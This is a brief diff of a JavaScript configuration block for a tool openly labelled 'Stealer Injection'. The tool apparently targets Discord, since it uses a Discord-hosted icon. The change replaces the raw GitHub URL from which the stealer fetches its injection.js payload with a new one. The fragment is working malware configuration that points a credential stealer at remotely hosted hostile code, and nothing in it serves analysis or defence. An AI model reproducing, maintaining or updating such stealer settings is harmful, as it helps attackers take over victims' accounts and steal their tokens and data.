@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Stealer Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/857933641437937664/1193300849145950470/tron.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/tron-security/injection/main/injection.js', 
   /**
    
    **/
